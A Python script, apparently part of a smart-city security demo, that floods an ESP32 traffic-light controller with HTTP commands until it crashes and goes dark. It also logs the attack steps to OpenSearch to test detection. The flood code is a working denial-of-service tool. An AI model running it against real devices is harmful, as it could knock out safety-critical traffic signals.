#!/usr/bin/env python3
"""
IoT Command Flood Attack — CityShield ESP32 Traffic Light

This script simulates a real DoS attack against the physical ESP32 traffic light.
It sends rapid HTTP requests to the device's /command endpoint, overwhelming it
and causing a crash (all traffic signals go dark — dangerous state).

After the crash, the device:
  - Shows erratic LED flashing (all lights flickering)
  - Rejects all commands except "restart"
  - Logs a critical "device_crash" event to OpenSearch
  - Requires restart from CityShield dashboard or physical RST button

Usage:
  python scripts/attack_esp32_flood.py --target <ESP32_IP>
  python scripts/attack_esp32_flood.py --target 172.20.10.4 --requests 50
"""

import argparse
import json
import time
import uuid
import requests
from datetime import datetime, timezone

OPENSEARCH_URL = "http://localhost:9200"


def log_attack_event(event_type, severity, message, target_ip, is_attack=True):
    """Log attack events to OpenSearch for CityShield detection."""
    event = {
        "@timestamp": datetime.now(timezone.utc).isoformat(),
        "component": "traffic_management",
        "event_type": event_type,
        "severity": severity,
        "city_zone": "zone-a",
        "src_ip": "10.0.99.1",  # Attacker IP
        "dst_ip": target_ip,
        "asset_id": "traffic-signal-esp32-01",
        "actor_id": "attacker-flood-01",
        "correlation_id": f"flood-attack-{uuid.uuid4().hex[:8]}",
        "message": message,
        "metadata": {
            "is_attack": is_attack,
            "attack_type": "command_flood",
            "device_type": "physical_esp32",
            "mitre_technique": "T1499",
            "mitre_tactic": "impact"
        }
    }
    try:
        resp = requests.post(
            f"{OPENSEARCH_URL}/logs-traffic/_doc",
            json=event,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        return resp.status_code == 201
    except Exception:
        return False


def check_device_status(target_ip):
    """Check current device status."""
    try:
        resp = requests.get(f"http://{target_ip}/status", timeout=3)
        return resp.json()
    except Exception as e:
        return {"error": str(e)}


def main():
    parser = argparse.ArgumentParser(description="IoT Command Flood Attack against ESP32 Traffic Light")
    parser.add_argument("--target", required=True, help="ESP32 IP address")
    parser.add_argument("--requests", type=int, default=50, help="Number of flood requests (default: 50)")
    parser.add_argument("--opensearch", default=OPENSEARCH_URL, help="OpenSearch URL")
    args = parser.parse_args()

    global OPENSEARCH_URL
    OPENSEARCH_URL = args.opensearch

    print("=" * 60)
    print("  CityShield IoT Attack: Command Flood")
    print("  Target: ESP32 Traffic Light Controller")
    print(f"  IP: {args.target}")
    print(f"  Requests: {args.requests}")
    print("=" * 60)

    # Phase 1: Recon — check device status
    print("\n[Phase 1] Reconnaissance...")
    status = check_device_status(args.target)
    if "error" in status:
        print(f"  Device unreachable: {status['error']}")
        print("  Make sure the ESP32 is powered on and connected to WiFi.")
        return
    print(f"  Device found: {status.get('asset_id', 'unknown')}")
    print(f"  State: {status.get('state', 'unknown')}")
    print(f"  Signal: {status.get('signal_state', 'unknown')}")
    print(f"  Free heap: {status.get('free_heap', 'unknown')} bytes")

    # Log recon event
    log_attack_event("port_scan", "warning",
                     f"Attacker scanning IoT device at {args.target}",
                     args.target)

    time.sleep(1)

    # Phase 2: Flood attack
    print(f"\n[Phase 2] Launching command flood ({args.requests} requests)...")
    log_attack_event("endpoint_dos", "high",
                     f"Command flood attack initiated against traffic light at {args.target}",
                     args.target)

    success_count = 0
    fail_count = 0
    crash_detected = False

    for i in range(args.requests):
        try:
            # Send random commands rapidly to overwhelm the device
            commands = ["status_check", "diag", "config_read", "ping", "health"]
            cmd = commands[i % len(commands)]
            resp = requests.post(
                f"http://{args.target}/command",
                json={"action": cmd},
                timeout=2
            )
            code = resp.status_code
            if code == 503:
                crash_detected = True
                print(f"  [{i+1}/{args.requests}] STATUS 503 — DEVICE CRASHED!")
                break
            elif code == 200:
                success_count += 1
            elif code == 400:
                fail_count += 1
            print(f"  [{i+1}/{args.requests}] Status: {code}", end="\r")
        except requests.exceptions.Timeout:
            print(f"  [{i+1}/{args.requests}] TIMEOUT — device may be overwhelmed")
            fail_count += 1
        except requests.exceptions.ConnectionError:
            print(f"  [{i+1}/{args.requests}] CONNECTION REFUSED — device crashed!")
            crash_detected = True
            break

    print(f"\n  Sent: {success_count + fail_count} | Success: {success_count} | Failed: {fail_count}")

    # Phase 3: Verify crash
    print("\n[Phase 3] Verifying device state...")
    time.sleep(1)
    status = check_device_status(args.target)
    device_state = status.get("state", "unknown")
    signal_state = status.get("signal_state", "unknown")
    print(f"  Device state: {device_state}")
    print(f"  Signal state: {signal_state}")

    if device_state == "crashed" or crash_detected:
        print("\n" + "!" * 60)
        print("  ATTACK SUCCESSFUL — TRAFFIC LIGHT CRASHED")
        print("  All signals are dark — intersection is UNSAFE")
        print("  Device requires restart from CityShield dashboard")
        print("  or physical RST button press")
        print("!" * 60)

        # Log critical event
        log_attack_event("device_crash", "critical",
                         f"Traffic light at {args.target} crashed due to command flood — all signals dark",
                         args.target)
        log_attack_event("service_overload", "critical",
                         f"IoT device DoS successful — {success_count + fail_count} requests sent in burst",
                         args.target)
    else:
        print("\n  Device survived the attack.")
        print(f"  Current signal: {signal_state}")

    print("\n[Done] Attack events logged to OpenSearch logs-traffic index.")
    print("  Check CityShield Alerts page for detection results.")
    print("  Use Device Management page to restart the crashed device.")


if __name__ == "__main__":
    main()
